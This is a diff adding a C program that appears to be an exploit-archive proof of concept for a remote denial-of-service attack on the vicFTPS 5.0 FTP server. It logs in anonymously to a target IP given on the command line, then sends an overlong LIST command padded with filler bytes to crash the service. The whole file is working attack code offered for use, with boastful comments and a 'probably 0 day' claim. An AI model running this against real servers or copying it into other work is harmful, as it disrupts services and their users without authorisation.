@@ -1,0 +1,88 @@
+#include <cstdio>
+#include <winsock2.h>
+#include <memory.h>
+#define __z00ro(a) memset(a,0,sizeof(a));
+
+//greetings : SiD.psycho 
+//Smallest greetings : Gorion  - lofamy cIem We want be like y0U :***
+
+unsigned int setport(const char* port){
+       if((atoi(port)==0) || (atoi(port)<0)){
+       return 21;
+       }
+       return atoi(port);                               
+}         
+
+int main(int argc,char **argv){
+
+printf("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+       "+=========== vicFTPS v 5.0 REMOTE dos POC ;[      ===========+\n"
+       "+=========== Alfons Luja sp Z.0.0                 ===========+\n"
+       "+=========== I want clear b00f not a d0s !!!      ===========+\n"
+       "+=========== Propably 0 dAy                       ===========+\n"
+       "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n");
+if(argc<3){
+   printf("\nuse poc.exe IP PORT\n");
+   return 0;
+}
+int socks;
+hostent *host;
+WSADATA WSA;
+SOCKADDR_IN aip;
+char recvs[666]={0}; //ave
+char test[66]={0};  // 4 nothing
+const char *login = "USER Anonymous\r\n";    
+const char *pass = "PASS echo@gov.tr\r\n";
+strcpy(test,"LIST /\\/iWana_be_like_Gorion\\");
+memset(test+strlen("LIST /\\/iWana_be_like_Gorion\\"),0x42,sizeof(test));
+test[sizeof(test)-2]='\r';
+test[sizeof(test)-1]='\n';
+test[sizeof(test)]='\0';
+printf("\nTarget:%s\nPort:%u\n",argv[1],setport(argv[2]));
+if((WSAStartup(MAKEWORD(4, 2), &WSA))==0){
+    if((socks = socket(AF_INET,SOCK_STREAM,0)) != -1){
+         aip.sin_family = AF_INET;
+         aip.sin_addr.s_addr = inet_addr(argv[1]);
+         aip.sin_port = htons(setport(argv[2]));
+         memset(&(aip.sin_zero),'0',8);
+     if(connect(socks,(struct sockaddr*)&aip,sizeof(struct sockaddr)) == 0){
+         recv(socks,recvs,sizeof(recvs)-1,0);
+         __z00ro(recvs);
+         send(socks,login,strlen(login),0);
+         recv(socks,recvs,sizeof(recvs)-1,0);
+         __z00ro(recvs);
+         send(socks,pass,strlen(pass),0);
+         recv(socks,recvs,sizeof(recvs)-1,0);     
+         printf("%s",recvs);
+          if(!strncmp(recvs,"230 fake user logged in.",3)){
+             printf("Send greeting!!\n");  
+             __z00ro(recvs);
+             send(socks,test,sizeof(test),0);  
+             recv(socks,recvs,sizeof(recvs)-1,0);   
+             Sleep(200); 
+             printf("Server is charmed and died happy!!\n");     
+          }
+          else{
+             printf("Target dont love us . You must have account :[\r\n");
+             closesocket(socks);       
+             WSACleanup();
+             return 0;     
+          }                       
+         }
+       else {
+       printf("(__eRROR):[Connection  error](!!!!)\n"
+              "It can be bad port number or IP addresss!\n");
+       closesocket(socks);       
+       WSACleanup();
+       return 0;    
+       }       
+      }
+      WSACleanup();
+     }   
+return 0;       
+}
+
+
+//~~@KND http://pl.youtube.com/watch?v=KvFAx3ArmlE ~@~
+
+// milw0rm.com [2008-10-24]
